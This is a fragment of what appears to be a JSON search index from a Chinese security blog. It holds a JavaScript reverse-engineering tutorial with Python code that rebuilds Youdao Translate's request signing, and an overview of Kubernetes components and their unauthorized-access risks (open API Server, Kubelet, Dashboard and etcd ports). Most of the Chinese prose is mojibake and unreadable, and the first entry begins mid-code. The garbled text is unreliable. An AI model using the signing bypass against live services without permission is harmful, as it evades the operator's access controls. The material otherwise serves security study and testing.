re.findall(pattern=\u0026#39;=\u0026#34;([a-zA-Z0-9]{20})\u0026#34;\u0026#39;, string=response.text)[-1] è¿™æ ·æ˜¯å¯ä»¥è·å¾—ç¬¬ä¸€ä¸ªsaltï¼Œæ¥ä¸‹æ¥æ˜¯ç¬¬äºŒä¸ªï¼Œéœ€è¦æ—¶é—´æˆ³â•signï¼š\ndef get_salt2(salt1): t = int(round(time.time() * 1000)) url = \u0026#34;https://dict.youdao.com/webtranslate/key\u0026#34; params = { \u0026#34;keyid\u0026#34;: \u0026#34;webfanyi-key-getter\u0026#34;, \u0026#34;sign\u0026#34;: get_sign(t,salt1), \u0026#34;client\u0026#34;: \u0026#34;fanyideskweb\u0026#34;, \u0026#34;product\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;appVersion\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;vendor\u0026#34;: \u0026#34;web\u0026#34;, \u0026#34;pointParam\u0026#34;: \u0026#34;client,mysticTime,product\u0026#34;, \u0026#34;mysticTime\u0026#34;: t, \u0026#34;keyfrom\u0026#34;: \u0026#34;fanyi.web\u0026#34;, \u0026#34;mid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;screen\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;wifi\u0026#34;, \u0026#34;abtest\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;yduuid\u0026#34;: \u0026#34;abcdefg\u0026#34; } response = requests.get(url, headers=HEADERS, cookies=COOKIES, params=params) return re.findall(pattern=\u0026#39;\u0026#34;([a-zA-Z0-9]{32})\u0026#34;\u0026#39;, string=response.text)[-1] å†å°†å‡½æ•°è¿›è¡Œç»Ÿä¸€è°ƒç”¨ï¼š\nimport requests import time from encode import get_sign, get_salt1, get_salt2, COOKIES, HEADERS url = \u0026#34;https://dict.youdao.com/webtranslate\u0026#34; # è·å–æ—¶é—´æˆ³ t = int(round(time.time() * 1000)) key1 = get_salt1() key2 = get_salt2(key1) data = { \u0026#34;i\u0026#34;: \u0026#34;ä½ å¥½\u0026#34;, \u0026#34;from\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useTerm\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;dictResult\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;keyid\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;sign\u0026#34;: get_sign(t,key2), \u0026#34;client\u0026#34;: \u0026#34;fanyideskweb\u0026#34;, \u0026#34;product\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;appVersion\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;vendor\u0026#34;: \u0026#34;web\u0026#34;, \u0026#34;pointParam\u0026#34;: \u0026#34;client,mysticTime,product\u0026#34;, \u0026#34;mysticTime\u0026#34;: t, \u0026#34;keyfrom\u0026#34;: \u0026#34;fanyi.web\u0026#34;, \u0026#34;mid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;screen\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;wifi\u0026#34;, \u0026#34;abtest\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;yduuid\u0026#34;: \u0026#34;abcdefg\u0026#34; } response = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data) print(response.text) print(response) è¿™æ ·æˆ‘ä»¬ä¾¿ä½¿ç”¨pythonå®ç°äº†å’Œæœ‰é“å‰ç«¯ä¸€æ ·çš„è¯·æ±‚åŠ å¯†é€»è¾‘ï¼š è‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†åŠ å¯†çš„å…¨è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å“åº”ç»“æœçš„è§£å¯†äº†\nè§£å¯†é€»è¾‘åˆ†æ ",
        "summary": "JSé€†å‘åŸºç¡€+æœ‰é“ç¿»è¯‘JSç®€å•åˆ†æ ç”±äºæœ€è¿‘å·¥ä½œä¸­æµ‹è¯•ç›¸å…³èµ„äº§æ—¶ï¼Œå‘ç°å¾ˆå¤šç½‘ç«™ï¼ŒåŒ…æ‹¬å°ç¨‹åºç­‰çš„webç«¯ï¼Œä¼ è¾“çš„æ•°æ®éƒ½æ˜¯ç»è¿‡äº†åŠ è§£å¯†çš„ï¼Œäºæ˜¯ä¾¿éœ€è¦æˆ‘ä»¬å¯¹jsä¸­çš„åŠ è§£å¯†éƒ¨åˆ†è¿›è¡Œåˆ†æã€è°ƒè¯•å’Œé€†å‘ï¼Œå¹¶ç¼–å†™hookä»£ç ï¼Œé…åˆä¸€äº›å·¥å…·å°†æˆ‘ä»¬æµ‹è¯•çš„è¯·æ±‚è‡ªåŠ¨åŠ å¯†ï¼Œå°†å“åº”è‡ªåŠ¨è§£å¯†ï¼ˆå…¶å®å’Œçˆ¬è™«éå¸¸ç±»ä¼¼ï¼‰ï¼Œå®ç°å¯¹æ•°æ®åŠ è§£å¯†çš„å¯¹æŠ—\nå‰ç½®çŸ¥è¯† JSç›¸å…³ ä½ å¯èƒ½éœ€è¦å…ˆæŒæ¡ï¼šjavascriptåŸºç¡€ã€é—­åŒ…ã€é¢å‘å¯¹è±¡ã€åŸå‹ã€åŸå‹é“¾\nå¯¹è¿™äº›æ¦‚å¿µæŒæ¡ä¸”èƒ½çœ‹æ‡‚jsä»£ç å³å¯\næ•°æ®ä¼ è¾“ç›¸å…³ åŠ è§£å¯†ã€ç¼–è§£ç ã€æ¶ˆæ¯æ‘˜è¦ï¼Œè¿™äº›å…¶å®å°±æ˜¯åº”ç”¨å¯†ç å­¦ç›¸å…³çŸ¥è¯†ï¼Œäº†è§£åŸç†å’Œä½œç”¨\nåŸºç¡€åè°ƒè¯• è¿™é‡Œè¯´çš„æ˜¯æœ€ç®€å•çš„ä¸€ç±»æƒ…å†µï¼Œå¸¸ä½“ç°ä¸ºç¦ç”¨F12ã€ç¦ç”¨å³é”®ç­‰ï¼Œéƒ½æ˜¯CTFå…¥é—¨æ¥è§¦çš„ï¼Œç›´æ¥åœ¨æµè§ˆå™¨é€‰é¡¹ä¸­è°ƒå‡ºå¼€å‘è€…å·¥å…·å³å¯\nç”±äºè°ƒå‡ºå¼€å‘è€…å·¥å…·åä¼šå æ®ä¸€éƒ¨åˆ†å±å¹•å¯¼è‡´innerWidthæˆ–innerHeightçš„å€¼å˜å°ï¼Œè¿™ä¸€å±æ€§ä¹Ÿæœ‰å¯èƒ½ç”¨äºåè°ƒè¯•ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯è®©å¼€å‘è€…å·¥å…·ä»¥å•ç‹¬çª—å£æ‰“å¼€è€Œä¸æ˜¯åœé åœ¨æµè§ˆå™¨é¡µé¢ä¸Š\nä¸€äº›å¼€å‘è€…å·¥å…·çš„åŠŸèƒ½ å¾ˆå¤šæ“ä½œåœ¨å¹²æ¸—é€çš„æ—¶å€™éƒ½ä¼šäº†ï¼Œå°±ä¸å¤šèµ˜è¿°ï¼Œè¿™é‡Œè®°å½•ä¸€ç‚¹ä»¥å‰æ²¡ç”¨è¿‡çš„ï¼š\nä¿ç•™æ—¥å¿—/æŒç»­è®°å½•ï¼ˆä¸€èˆ¬å¼€å¯ï¼‰ ç¦ç”¨ç¼“å­˜ï¼ˆä¸€èˆ¬å¼€å¯ï¼‰ å†…å®¹æ ¼å¼åŒ–ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯æœç´¢æ–‡ä»¶å†…å®¹æœ€å¥½æœç´¢æ ¼å¼åŒ–ä¹‹å‰çš„ï¼Œæ ¼å¼åŒ–å¯èƒ½ä¼šè¡¥å……ç©ºæ ¼ä¹‹ç±»çš„å¯¼è‡´æœç´¢ä¸åˆ°ï¼‰ Fetch/XHRï¼šjsä»£ç ä¸­å‘é€çš„ç½‘ç»œè¯·æ±‚ï¼Œæ¯”å¦‚fetch/ajax æ–‡æ¡£/HTMLï¼šé¡µé¢åŠ è½½çš„ç¬¬ä¸€ä¸ªhtml ç½‘ç»œï¼šå¯ä»¥çœ‹åˆ°è¯·æ±‚ä¸å“åº”ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨è¿™é‡Œæ— æ³•é€šè¿‡ctrl+fè¿›è¡Œæœç´¢è¯·æ±‚ä½“å†…å®¹ï¼‰ è°ƒç”¨å †æ ˆï¼šè°ƒè¯•ç•Œé¢çš„åŠŸèƒ½ï¼Œå½“å‡½æ•°è¿è¡Œèµ·æ¥æ—¶ï¼Œè°ƒç”¨å †æ ˆå¯ä»¥æè¿°å½“å‰è¿è¡Œåˆ°çš„æ–­ç‚¹å¤„çš„ä»£ç  æ§åˆ¶å°è¾“å‡ºï¼šåˆ†ä¸ºé”™è¯¯ã€å‘Šè­¦ã€ä¿¡æ¯ã€æ—¥å¿—ã€è°ƒè¯•ç­‰å‡ ç§è¾“å‡ºçº§åˆ« åŸºç¡€æ­¥éª¤ è¿™é‡Œä»¥æœ‰é“ç¿»è¯‘çš„æ–‡æœ¬ç¿»è¯‘åŠŸèƒ½ä¸ºä¾‹æ¥å°†åŸºç¡€è¿‡ä¸€éï¼Œè¿™é‡Œå…ˆç”¨å†™çˆ¬è™«ä¸€æ ·çš„é€»è¾‘æ¥èµ°ä¸€éï¼Œåé¢å†å†™å…³äºæ¸—é€æµ‹è¯•ç¯å¢ƒä¸­çš„ç®€å•åˆ†æ\nåŠ å¯†é€»è¾‘åˆ†æ é¦–å…ˆæ˜¯åŠ å¯†ï¼Œå³æˆ‘ä»¬å‘é€è¯·æ±‚æ—¶æŠ“åŒ…ï¼Œå‘ç°åŒ…ä¸­çš„ä¸€äº›æ•°æ®ä¸æ˜¯æ˜æ–‡ï¼Œæˆ–è€…ç›¸æ¯”æäº¤çš„æ•°æ®å¤šäº†ä¸€äº›åƒç­¾åä¹‹ç±»çš„å‚æ•°ï¼Œå°±éœ€è¦åˆ†æå‰ç«¯åŠ å¯†é€»è¾‘\nå®šä½æ•°æ®æ¥æº é¦–å…ˆéœ€è¦åšçš„äº‹å°±æ˜¯å®šä½æˆ‘ä»¬æ•°æ®äº¤äº’æ—¶åŠ è§£å¯†æ•°æ®çš„è¯·æ±‚åŒ…ï¼Œå¯¹äºå­¦ä¹ äº†ç½‘å®‰çš„äººï¼Œç›¸ä¿¡ä¸è®ºæ˜¯f12è¿˜æ˜¯burpéƒ½æ˜¯æä¸ºç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾å®šä½åˆ°æŒ‡å®šæ–‡æœ¬ç¿»è¯‘åŠŸèƒ½çš„åŒ…ï¼š è¯†åˆ«åŠ å¯†å‚æ•° è¿™é‡Œæˆ‘ä»¬å…ˆå°†å®šä½åˆ°çš„è¯·æ±‚åŒ…å¤åˆ¶ä¸ºcurlå‘½ä»¤ï¼š\nå¹¶è½¬æ¢ä¸ºpython requestï¼š\nåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿è¡Œè„šæœ¬å¹¶è·å¾—åŠ å¯†åçš„ç»“æœï¼š\næˆ‘ä»¬åˆ†æè¯·æ±‚å‚æ•°:\ndata = { \u0026#34;i\u0026#34;: \u0026#34;ä½ å¥½\u0026#34;, \u0026#34;from\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;useTerm\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;dictResult\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;keyid\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;sign\u0026#34;: \u0026#34;68732687ef98f424db7c2c20c30ddb9d\u0026#34;, \u0026#34;client\u0026#34;: \u0026#34;fanyideskweb\u0026#34;, \u0026#34;product\u0026#34;: \u0026#34;webfanyi\u0026#34;, \u0026#34;appVersion\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;vendor\u0026#34;: \u0026#34;web\u0026#34;, \u0026#34;pointParam\u0026#34;: \u0026#34;client,mysticTime,product\u0026#34;, \u0026#34;mysticTime\u0026#34;: \u0026#34;1747409777255\u0026#34;, \u0026#34;keyfrom\u0026#34;: \u0026#34;fanyi.web\u0026#34;, \u0026#34;mid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;screen\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;wifi\u0026#34;, \u0026#34;abtest\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;yduuid\u0026#34;: \u0026#34;abcdefg\u0026#34; } å…¶å®ä¸éš¾çœ‹å‡ºæ¥ä¸€äº›å…³é”®ä¿¡æ¯ï¼š\niå°±æ˜¯æˆ‘ä»¬è¯·æ±‚çš„æ–‡æœ¬å†…å®¹æ˜æ–‡ signåœ¨è¿™é‡Œåº”è¯¥æ˜¯md5è¿™ç§è¯·æ±‚æ‘˜è¦ç­¾åï¼Œé€šè¿‡æ›´æ”¹å…¶ä»–çš„å‚æ•°ï¼ŒæŸ¥çœ‹åŠ å¯†çš„å“åº”å¯ä»¥çŸ¥é“ï¼Œå‚æ•° i æ²¡æœ‰å‚ä¸æ‘˜è¦ç®—æ³•ï¼Œä½†æ—¶é—´æˆ³mysticTimeå‚ä¸äº†ï¼ˆç­¾åä¸€èˆ¬éƒ½æ˜¯æœ¬åœ°jsç”Ÿæˆï¼‰ å®šä½åˆ†æåŠ å¯†ç®—æ³• å…¥æ‰‹ç‚¹è‚¯å®šæ˜¯signçš„ç­¾åç®—æ³•ï¼Œé€šè¿‡å…¨å±€æœç´¢å¯»æ‰¾ä¸€ä¸‹ï¼ˆå¯ä»¥è¿‡æ»¤æ‰æ— ç”¨çš„æ–‡ä»¶ç±»å‹æ¯”å¦‚cssï¼‰ï¼Œåƒä¸‹é¢è¿™æ ·æœç´¢å…³é”®å­—ï¼š\nsign sign=ï¼ˆæ³¨æ„è¿™é‡Œä¸è¦åŠ ç­‰å·ï¼‰ sign: \\bsignï¼ˆéœ€è¦å¯ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œ\\bä»£è¡¨åŒ¹é…å­—ç¬¦è¾¹ç•Œï¼‰ å¯ä»¥å‘ç°å¾ˆå¤šç–‘ä¼¼çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥éƒ½æ‰“ä¸Šæ–­ç‚¹è¿›è¡ŒéªŒè¯ï¼Œæ¯”å¦‚ï¼š\n"
    }
,
    {
        "title": "K8så®‰å…¨åŸºç¡€",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/",
        "content": "Kuberneteså®‰å…¨åŸºç¡€ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nk8såŸºç¡€ k8sæ¶æ„ Kubernetes åˆç§° k8sï¼Œæ˜¯ Google åœ¨ 2014 å¹´å¼€æºçš„ä¸€ä¸ªç”¨æ¥ç®¡ç†å®¹å™¨çš„å¹³å°\nk8såŸºæœ¬æ¶æ„å¦‚ä¸‹ï¼š ä»ä¸Šå›¾æ¥çœ‹å¯ä»¥çŸ¥é“ï¼Œk8sä¸»è¦ç”±è¾ƒå°‘çš„masterèŠ‚ç‚¹å’Œå…¶å¯¹åº”çš„å¤šä¸ªNodeèŠ‚ç‚¹ç»„æˆï¼ŒmasterèŠ‚ç‚¹å¯¹nodeåŠè¯¶å•è¿›è¡Œç®¡ç†æ§åˆ¶ï¼Œä¸€ä¸ªK8sé›†ç¾¤è‡³å°‘è¦æœ‰ä¸€å°masterèŠ‚ç‚¹\nmasterèŠ‚ç‚¹ä¸»è¦æœ‰ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š\netcd ä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€ API Server æä¾›äº†èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€API æ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶ Controller Manager è´Ÿè´£ç»´æŠ¤é›†ç¾¤çš„çŠ¶æ€ï¼Œæ¯”å¦‚æ•…éšœæ£€æµ‹ã€è‡ªåŠ¨æ‰©å±•ã€æ»šåŠ¨æ›´æ–°ç­‰ Scheduler è´Ÿè´£èµ„æºçš„è°ƒåº¦ï¼ŒæŒ‰ç…§é¢„å®šçš„è°ƒåº¦ç­–ç•¥å°† Pod è°ƒåº¦åˆ°ç›¸åº”çš„æœºå™¨ä¸Š nodeèŠ‚ç‚¹æœ‰ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š\nKubelet è´Ÿè´£ç»´æŠ¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†ï¼Œæ¯ä¸ªnodeèŠ‚ç‚¹ä¸­éƒ½å­˜åœ¨ä¸€ä»½\nContainer Runtime è´Ÿè´£é•œåƒç®¡ç†ä»¥åŠ Pod å’Œå®¹å™¨çš„çœŸæ­£è¿è¡Œï¼ˆCRIï¼‰ï¼Œæ—©æœŸæ˜¯dockerå¼•æ“ä½œä¸ºç»„ä»¶ï¼Œä»v1.20å¼€å§‹ä½¿ç”¨ containerdã€CRI-O ç­‰\nKube-proxy è´Ÿè´£ä¸º Service æä¾› Cluster å†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡\npod æ˜¯k8sä¸­çš„æœ€å°è°ƒåº¦å•ä½ï¼Œpodå†…éƒ¨å°±æ˜¯å®¹å™¨ï¼Œk8sé€šè¿‡æ“ä½œpodæ¥æ§åˆ¶å®¹å™¨ï¼Œä¸€ä¸ªnodeä¸‹é¢å¯ä»¥æœ‰å¤šä¸ªpod\nfluentdä¸æ˜¯ Kubernetes çš„æ ¸å¿ƒç»„ä»¶ï¼Œä½†å¸¸ç”¨äºæ—¥å¿—æ”¶é›†ï¼Œå°† Pod çš„ stdout/stderr æ—¥å¿—é‡‡é›†åˆ°é›†ä¸­ç³»ç»Ÿï¼ˆå¦‚ Elasticsearchã€Kafkaï¼‰ä¸­ã€‚\nPodå¯ä»¥è¯´æ˜¯NodeèŠ‚ç‚¹ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼ŒPodä¹Ÿæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªâ€ç”¨æ¥å°è£…å®¹å™¨çš„å®¹å™¨â€ã€‚ä¸€ä¸ªPodä¸­å¾€å¾€ä¼šè£…è½½å¤šä¸ªå®¹å™¨ï¼Œè¿™äº›å®¹å™¨å…±ç”¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œå…±äº«ç€ç½‘ç»œå’Œå­˜å‚¨ç­‰èµ„æº\nè¿™äº›å®¹å™¨çš„èµ„æºå…±äº«ä»¥åŠç›¸äº’äº¤äº’éƒ½æ˜¯ç”±podé‡Œé¢çš„pauseå®¹å™¨æ¥å®Œæˆçš„ï¼Œæ¯åˆå§‹åŒ–ä¸€ä¸ªpodæ—¶ä¾¿ä¼šç”Ÿæˆä¸€ä¸ªpauseå®¹å™¨\nk8sç‰¹ç‚¹ å’Œdockerç›¸æ¯”ï¼Œdockeræ›´åå‘äºå•æœºç®¡ç†ï¼Œè€Œk8såˆ™æ˜¯åå‘äºå¤šæœºé›†ç¾¤ç®¡ç†ï¼Œç”±äºå®¹å™¨çš„å¯¿å‘½æ¯”è¾ƒçŸ­æš‚ï¼Œéœ€è¦ç»å¸¸è°ƒè¯•ç¯å¢ƒï¼Œè€Œé‡æ–°æ‰“åŒ…éƒ¨ç½²å®¹å™¨æ¯”è¾ƒéº»çƒ¦ï¼Œåˆä¼šå­˜åœ¨ä¸€ç³»åˆ—é—®é¢˜ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç½‘ç»œï¼Œæ•°æ®åŒæ­¥ç­‰ï¼Œå› æ­¤æ‰æœ‰äº†K8Sæ¥å¯¹å®¹å™¨è¿›è¡Œéƒ¨ç½²å’Œç®¡ç†\nk8så…·æœ‰å¦‚ä¸‹çš„ç‰¹ç‚¹ï¼š\nè‡ªæˆ‘ä¿®å¤ï¼šå¯¹å®¹å™¨è¿›è¡Œç›‘æµ‹ï¼Œå‡ºç°é—®é¢˜å°±åœ¨åŸæœ‰æ— é—®é¢˜å®¹å™¨åŸºç¡€ä¸Šè¿›è¡Œå¤åˆ¶å¯åŠ¨ï¼Œå‡ºç°é—®é¢˜çš„å®¹å™¨è¿›è¡ŒæŠ›å¼ƒæˆ–é‡å¯\nå¼¹æ€§ä¼¸ç¼©ï¼šå®¹å™¨æ•°é‡çš„æ§åˆ¶\nè‡ªåŠ¨éƒ¨ç½²å’Œå›æ»šï¼šé€šè¿‡é…ç½®æ–‡ä»¶è¿›è¡Œè‡ªåŠ¨çš„å®¹å™¨æ„å»ºï¼Œå¯¹å®¹å™¨çš„å›æ»šæ›´æ–°\næœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ï¼šé»˜è®¤æ–¹æ¡ˆ\næœºå¯†å’Œé…ç½®ç®¡ç†ï¼šå¯¹æ•æ„Ÿæ•°æ®æˆ–å…¶ä»–è¿›è¡Œé…ç½®ç®¡ç†\nå­˜å‚¨ç¼–æ’ï¼šè™šæ‹Ÿç£ç›˜ä¸ç‰©ç†ç£ç›˜\næ‰¹å¤„ç†ï¼šæ‰¹é‡ä»»åŠ¡å®ç°\nk8så·¥ä½œæµç¨‹ kubectl æ˜¯ k8s çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œç®¡ç†é›†ç¾¤\nç”¨æˆ·ç«¯å‘½ä»¤ä¸‹å‘é€šå¸¸æµç¨‹å¦‚ä¸‹ï¼š\nkubectlå‘apiserverå‘é€éƒ¨ç½²è¯·æ±‚ï¼ˆä¾‹å¦‚ä½¿ç”¨ kubectl create -f deployment.ymlï¼‰ apiserverå°† Deployment æŒä¹…åŒ–åˆ°etcdï¼›etcdä¸apiserverè¿›è¡Œä¸€æ¬¡httpé€šä¿¡ controller manageré€šè¿‡watch apiç›‘å¬ apiserver ï¼Œdeployment controllerçœ‹åˆ°äº†ä¸€ä¸ªæ–°åˆ›å»ºçš„deplaymentå¯¹è±¡æ›´åï¼Œå°†å…¶ä»é˜Ÿåˆ—ä¸­æ‹‰å‡ºï¼Œæ ¹æ®deploymentçš„æè¿°åˆ›å»ºä¸€ä¸ªReplicaSetå¹¶å°† ReplicaSet å¯¹è±¡è¿”å›apiserverå¹¶æŒä¹…åŒ–å›etcd æ¥ç€schedulerè°ƒåº¦å™¨çœ‹åˆ°æœªè°ƒåº¦çš„podå¯¹è±¡ï¼Œæ ¹æ®è°ƒåº¦è§„åˆ™é€‰æ‹©ä¸€ä¸ªå¯è°ƒåº¦çš„èŠ‚ç‚¹ï¼ŒåŠ è½½åˆ°podæè¿°ä¸­nodeNameå­—æ®µï¼Œå¹¶å°†podå¯¹è±¡è¿”å›apiserverå¹¶å†™å…¥etcd kubeletåœ¨çœ‹åˆ°æœ‰podå¯¹è±¡ä¸­nodeNameå­—æ®µå±äºæœ¬èŠ‚ç‚¹ï¼Œå°†å…¶ä»é˜Ÿåˆ—ä¸­æ‹‰å‡ºï¼Œé€šè¿‡å®¹å™¨è¿è¡Œæ—¶åˆ›å»ºpodä¸­æè¿°çš„å®¹å™¨ K8sç›¸å…³é£é™© åŸºæœ¬é¢ä¸´5ç§é£é™©ï¼š\nå®¹å™¨åŸºç¡€è®¾æ–½ç›¸å…³é£é™© è¿™ä¸ªå’Œdockerçš„å®¹å™¨é£é™©ç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è®°å½•äº†\nç»„ä»¶æ¥å£ç›¸å…³é£é™© API Server API Sevreré»˜è®¤æœåŠ¡ç«¯å£ä¸º8080å’Œ6443ï¼Œ8080ç«¯å£æä¾›äº†httpæœåŠ¡ï¼Œæ²¡æœ‰è®¤è¯ä¸æˆæƒæœºåˆ¶ï¼Œè€Œ6443æä¾›httpæœåŠ¡æ”¯æŒè®¤è¯å’ŒæˆæƒæœåŠ¡\né»˜è®¤æƒ…å†µ8080ç«¯å£ä¸ä¼šå¯åŠ¨ï¼Œä½†å¦‚æœç”¨æˆ·å¼€å¯äº†è¯¥æœåŠ¡å°±ä¼šé€ æˆAPI Serverçš„æœªæˆæƒè®¿é—®ï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªé›†ç¾¤\nKubelet Kubeletä¹Ÿè¿è¡ŒAPIæœåŠ¡ï¼Œé»˜è®¤æœåŠ¡ç«¯å£ä¸º10250å’Œ10248\nkubeletä¹Ÿå­˜åœ¨æœªæˆæƒï¼Œè‹¥å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥æ§åˆ¶æ‰€åœ¨çš„èŠ‚ç‚¹æƒé™\nDashboard Dashboardé»˜è®¤ç«¯å£8001ï¼Œä» 1.10.1 ç‰ˆæœ¬èµ·ï¼ŒDashboard é»˜è®¤ç¦ç”¨äº†è·³è¿‡æŒ‰é’®ï¼Œä½†å¦‚æœç”¨æˆ·ä¸ºäº†æ–¹ä¾¿æˆ–è€…å…¶ä»–åŸå› ï¼Œå¼€å¯äº†ç›¸å…³åŠŸèƒ½ï¼Œå°±ä¼šå¯¼è‡´ Dashboard çš„æœªæˆæƒè®¿é—®\netcd etcdé»˜è®¤ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼š\n2379ï¼šç”¨äºå®¢æˆ·ç«¯è¿æ¥ 2380ï¼šç”¨äºå¤šä¸ªetcdå®ä¾‹ä¹‹é—´çš„é€šä¿¡ é»˜è®¤æƒ…å†µä¸‹ï¼Œetcd æä¾›çš„ä¸¤ä¸ªç«¯å£éƒ½éœ€è¦ç›¸åº”çš„è¯ä¹¦æ‰èƒ½è®¿é—®ï¼Œä½†å¦‚æœæ”»å‡»è€…çªƒå–äº†è¯ä¹¦æˆ–è€…ç”¨æˆ·å°†etcdè®¾ç½®äº†å…è®¸åŒ¿åè®¿é—®ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è®¿é—®etcdå¹¶çªƒå–ç›¸å…³æ•°æ®\nk8sé›†ç¾¤å†…éƒ¨çš„å„ç§èµ„æºåŠå…¶çŠ¶æ€éƒ½å­˜åœ¨etcdä¸­ï¼Œå¦‚æœå¯ä»¥è¯»å–etcdçš„æ•°æ®ï¼Œå°±å¯èƒ½è·å–é«˜æƒé™ï¼Œè¿›è€Œæ§åˆ¶é›†ç¾¤\né›†ç¾¤ç½‘ç»œç›¸å…³é£é™© Podæ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨æ„æˆçš„é›†åˆï¼Œåœ¨æ²¡æœ‰å…¶ä»–ç½‘ç»œéš”ç¦»ç­–ç•¥å’Œå’Œpodå®‰å…¨ç­–ç•¥çš„é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸åŒpodä¹‹é—´å¯ä»¥è”é€šï¼Œä¸”Podå†…çš„rootç”¨æˆ·å…·æœ‰CAP_NET_RAWæƒé™ï¼ˆå³å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—çš„æƒé™ï¼Œå…è®¸ç¨‹åºç»•è¿‡å¸¸è§„çš„ TCP/UDP åè®®æ ˆï¼Œç›´æ¥æ„é€ å’Œå‘é€è‡ªå®šä¹‰çš„ IP åŒ…è¿›è¡Œé›†ç¾¤å†…ç½‘æ¢æµ‹ï¼‰ï¼Œå› æ­¤é›†ç¾¤å†…å¯èƒ½å‘ç”Ÿå†…ç½‘æ¨ªå‘çš„é£é™©\nè®¿é—®æœºåˆ¶ç›¸å…³é£é™© Kubernetes ä¸­çš„è®¿é—®æ§åˆ¶æœºåˆ¶ä¸»è¦ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š\nè®¤è¯æœºåˆ¶ æˆæƒæœºåˆ¶ å‡†å…¥æœºåˆ¶ å¦‚æœè®¿é—®æ§åˆ¶æ¯”è¾ƒå®½æ¾æˆ–æ··ä¹±æˆ–è€…å…è®¸ Kubernetes çš„æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»äººå‘˜å¯èƒ½å€Ÿæ­¤ç›´æ¥è·å¾—é›†ç¾¤ç®¡ç†å‘˜æƒé™\nä¸€äº›Kubernetes ç›‘æ§éƒ¨ç½²å¹³å°å­˜åœ¨ \u0026ldquo;å¯èƒ½çš„éªŒè¯ç¼ºå¤±\u0026rdquo; å’Œ \u0026ldquo;å¯¹å…¬ç½‘/å¤–ç½‘å¼€æ”¾\u0026rdquo; çš„é”™è¯¯é…ç½®å¯èƒ½, å¯ä»¥å¯¼è‡´ä¸¥é‡çš„é›†ç¾¤æ¥ç®¡çš„é—®é¢˜ï¼Œå¹¶ä¸”åˆ©ç”¨è¿™ç±»å¹³å°å³å¯å®ç°k8sçš„æƒé™ç»´æŒ\nK8sè‡ªèº«æ¼æ´ 